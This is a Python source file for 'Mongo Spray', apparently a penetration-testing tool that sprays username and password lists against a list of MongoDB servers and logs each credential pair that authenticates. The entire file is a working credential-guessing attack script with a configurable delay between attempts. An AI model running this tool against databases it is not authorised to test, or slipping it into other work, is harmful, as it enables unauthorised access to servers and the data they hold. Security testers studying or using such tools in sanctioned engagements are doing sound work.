import time
import sys
import ZHOR_Modules.fileManager as fm
import ZHOR_Modules.nicePrints as np
import ZHOR_Modules.logUtils as logu

import pymongo
import argparse
import sys
import time

import pymongo.errors

parser = argparse.ArgumentParser(description="Mongo Spray v101024")
REQUIRED_ARGUMENTS = parser.add_argument_group("Required arguments")
OPTIONAL_ARGUMENTS = parser.add_argument_group("Optional arguments")

# Argomenti necessari
REQUIRED_ARGUMENTS.add_argument('-t',metavar='"TARGET LIST"',type=str,required=True,help='Target IP or fqdn list file')
REQUIRED_ARGUMENTS.add_argument('-u',metavar='"USERS"',type=str,required=True,help='Users list file')
REQUIRED_ARGUMENTS.add_argument('-p',metavar='"PASSWORDS"',type=str,required=True,help='Passwords list file')
REQUIRED_ARGUMENTS.add_argument('-T',metavar='"TIME"',type=int,required=True,help='Time between each request (in milliseconds)')


# Argomenti opzionali
OPTIONAL_ARGUMENTS.add_argument('--debug',action="store_true",help="Debug mode")
OPTIONAL_ARGUMENTS.add_argument('--timeout',type=int,required=False,help='Connection attempt timeout (in milliseconds). By default is 1000')

args = parser.parse_args()

np.DEBUG = ('--debug' in sys.argv)

# ========================================================================================================


# target is in the form of ip:port
# example: 192.168.1.100:12345
def performConnection(target: str, username: str, password: str,timeout=1):

    values = target.split(':')
    
    try:
        
        with pymongo.timeout(timeout):
            client = pymongo.MongoClient(
                host=values[0],port=int(values[1]),username=username,password=password
                )
            
            client.server_info()

            msg = "[SUCCESS] Target {} --- User: {} --- Password: {}".format(target,username,password)
            logu.logInfo(msg)

    # auth failed
    except pymongo.errors.OperationFailure as e0:
        msg = "[FAIL] Target {} --- User: {} --- Password: {}".format(target,username,password)
        logu.logDebug(msg)

    # other exceptions
    except Exception as e2:
        msg = "[EXCEPTION] Target {} --- User: {} --- Password: {} --- check log for details".format(target,username,password)
        logu.logError(msg)        
        


if __name__ == '__main__':
    targets = fm.fileToSimpleList(args.t)
    users = fm.fileToSimpleList(args.u)
    passwords = fm.fileToSimpleList(args.p)
    sleepTime = None

    if args.T == 0:
        sleepTime = 0
    else:
        sleepTime = args.T / 1000

    timeout = 1

    if '--timeout' in sys.argv:
        timeout = int(args.timeout) / 1000

    msg = "Spraying started. Testing {} targets with {} usernames and {} passwords".format(
        str(len(targets)),
        str(len(users)),
        str(len(passwords))
    )
    np.infoPrint(msg)

    for t in targets:
        for u in users:
            for p in passwords:
                    
                msg = "target {} --- User: {} --- Password: {}".format(t,u,p)
                np.debugPrint("Testing " + msg)
                performConnection(t,u,p,timeout)
                time.sleep(sleepTime) 

                #input()